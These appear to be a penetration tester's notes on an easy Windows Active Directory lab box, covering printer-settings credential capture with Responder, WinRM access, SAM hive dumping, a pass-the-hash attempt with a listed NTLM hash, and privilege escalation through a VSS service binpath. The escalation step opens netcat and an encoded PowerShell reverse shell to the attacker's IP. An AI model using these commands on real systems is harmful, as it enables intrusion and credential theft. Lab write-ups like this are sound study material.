---
Status: Done
OS: Windows AD
Difficulty: Easy
tags:
  - Service
  - winrm
Date: 2026-06-25T14:00:00
Owned: 2026-06-26T14:21:00
---

---


# Enumeration
## port scan

using naabu  
```sh
naabu -host 10.129.95.241 -p - | nerva -o allport.txt
```
![[Pasted image 20260625140850.png]]
port 80  
![[Pasted image 20260625140500.png]]

## dir enum
run feroxbuster  
```sh
feroxbuster -u http://10.129.95.241 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox80.txt
```
![[Pasted image 20260625141137.png]]
result found /settings.php  
![[Pasted image 20260625140701.png]]
we can update the password from here  
try to set the password but when tried with winrm, smb it doesn't work  
let's use burp to capture  
![[Pasted image 20260625143227.png]]
tried changing everything on the page and click update only ip field is sent  
![[Pasted image 20260625143526.png]]
maybe we could set the server ip to our machine  
and use responder to capture anything sent to authenticate  
```sh
sudo responder -I tun0
```
![[Pasted image 20260625143437.png]]
got the creds  
now let's use it with available service  
![[Pasted image 20260625143705.png]]
![[Pasted image 20260625143837.png]]
![[Pasted image 20260625144422.png]]
let's winrm using evil-winrm  
```

```
![[Pasted image 20260625144606.png]]
got the user flag  
# Exploit

# Privilege Escalation attempt#1

check priv
```
whoami /priv
```
![[Pasted image 20260625144911.png]]

for SeRestorePrivilege
we can replace utilman.exe with cmd.exe 
then we can run net user with adminpriv

for this box i couldn't replace utilman.exe
 ![[Pasted image 20260625151940.png]]
since we have SeBackup
```
cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
```
success  
![[Pasted image 20260625152537.png]]
transfer the file to our attacking machine  
use smbclient to get the file  
```
impacket-smbclient return.local/svc-printer@10.129.95.241
```
![[Pasted image 20260625153400.png]]  
use impacket secretsdump  
```
impacket-secretsdump -sam SAM -system SYSTEM local
```
![[Pasted image 20260625153429.png]]

use psexec with hash
```
impacket-psexec Administrator@printer.return.local -hashes ':34386a771aaca697f447754e4863d38a'
```
didn't work  

trying shadow copy to get ntds.dit
```
nano test.dsh

set context persistent nowriters
add volume c: alias test
create
expose %test% z:

unix2dos test.dsh
```


```
diskshadow /s test.dsh
robocopy /b z:\windows\ntds . ntds.dit
```

didn't work either  

# Privilege Escalation solution

In this box, we need to check the group policy
![[Pasted image 20260626132224.png]]
this is a builtin groups with privilege to start/stop service  
```sh
upload /opt/netcat/nc64.exe
```
![[Pasted image 20260626134228.png]]
we can list service that this account can modify by running  
```sh
sc.exe query
```
we can't list the service, but we will use vss since we have SeBackupPriv
![[Pasted image 20260626134255.png]]
we will abuse by having it run nc64.exe to get revshell  
```sh
 sc.exe config VSS binpath="C:\programdata\nc64.exe -e cmd 10.10.14.223 443"
```
![[Pasted image 20260626134427.png]]
stop and start the service  
![[Pasted image 20260626134608.png]]
got the shell  
but the shell will broke in seconds  

## solution for shell
this time we called cmd.exe first then call powershell  
the reason this work is when the service fails to start in service way it automatically stop the service  
calling cmd first make it kill the cmd but not our revshell  
```sh
sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAyADMAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

```
![[Pasted image 20260626135946.png]]